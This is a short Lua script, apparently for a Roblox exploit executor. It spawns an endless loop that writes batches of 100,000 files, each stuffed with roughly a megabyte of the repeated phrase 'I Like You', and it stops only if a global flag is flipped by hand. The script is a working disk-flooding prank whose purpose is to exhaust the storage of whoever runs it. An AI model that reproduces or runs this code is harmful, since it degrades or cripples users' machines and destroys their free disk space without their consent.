_G.STOP_SPAM = false
 local function spamFiles()
     if not writefile then
         warn("I Love You")
         return
     end
     local counter = 0
     while not _G.STOP_SPAM do
         counter = counter + 1
         for i = 1, 100000 do
             local filename = string.format("ilikeu_%04d_%d.txt", counter, i)
             local content = string.format(string.rep(" I Like You", 100000) .. "\n\nFile #%d-%d\nDibuat: %s", counter, i, os.date("%Y-%m-%d %H:%M:%S"))
             writefile(filename, content)
         end
         print("[I love You]")
         task.wait(0.001)
     end
     print("[Spam] Dihentikan.")
 end

 task.spawn(spamFiles)
